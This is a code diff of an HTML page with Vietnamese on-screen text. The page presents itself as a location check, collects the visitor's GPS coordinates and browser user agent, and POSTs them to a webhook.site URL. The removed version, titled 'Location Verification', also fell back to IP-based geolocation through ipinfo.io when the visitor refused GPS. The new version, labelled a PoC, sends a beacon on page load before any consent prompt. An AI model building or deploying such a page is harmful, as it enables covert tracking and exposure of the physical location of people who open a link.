@@ -2,78 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Location Verification</title>
+  <title>Location PoC</title>
 </head>
 <body>
-  <h2>Đang kiểm tra vị trí, vui lòng chờ...</h2>
+  <h2>Đang lấy vị trí...</h2>
   <script>
-    // Webhook endpoint
     const webhook = "https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca";
 
     function sendToWebhook(data) {
       fetch(webhook, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify(data)
-      });
+      })
+      .then(() => console.log("Sent:", data))
+      .catch(e => console.error("Error:", e));
     }
 
-    // Lấy vị trí qua HTML5 Geolocation
+    // Luôn gửi ít nhất một bản ghi cơ bản
+    sendToWebhook({
+      status: "init",
+      ua: navigator.userAgent,
+      time: new Date().toISOString()
+    });
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
           sendToWebhook({
-            status: "success",
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
+            status: "gps_success",
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
             accuracy: pos.coords.accuracy,
             ua: navigator.userAgent,
             time: new Date().toISOString()
           });
-          document.body.innerHTML += "<p>Đã ghi nhận vị trí.</p>";
+          document.body.innerHTML += "<p>GPS sent!</p>";
         },
         err => {
-          // Nếu user deny → fallback bằng IP
-          fetch("https://ipinfo.io/json")
-            .then(r => r.json())
-            .then(d => {
-              let [lat, lon] = d.loc.split(",");
-              sendToWebhook({
-                status: "fallback_ip",
-                latitude: lat,
-                longitude: lon,
-                city: d.city,
-                region: d.region,
-                country: d.country,
-                ua: navigator.userAgent,
-                time: new Date().toISOString()
-              });
-              document.body.innerHTML += "<p>Đã ghi nhận vị trí IP.</p>";
-            });
-        }
-      );
-    } else {
-      // Nếu browser không hỗ trợ → chỉ dùng IP
-      fetch("https://ipinfo.io/json")
-        .then(r => r.json())
-        .then(d => {
-          let [lat, lon] = d.loc.split(",");
           sendToWebhook({
-            status: "ip_only",
-            latitude: lat,
-            longitude: lon,
-            city: d.city,
-            region: d.region,
-            country: d.country,
+            status: "gps_denied",
+            error: err.message,
             ua: navigator.userAgent,
             time: new Date().toISOString()
           });
-          document.body.innerHTML += "<p>Đã ghi nhận vị trí qua IP.</p>";
-        });
+          document.body.innerHTML += "<p>GPS denied, fallback data sent!</p>";
+        }
+      );
+    } else {
+      sendToWebhook({
+        status: "no_geolocation_api",
+        ua: navigator.userAgent,
+        time: new Date().toISOString()
+      });
     }
   </script>
 </body>
 </html>
-
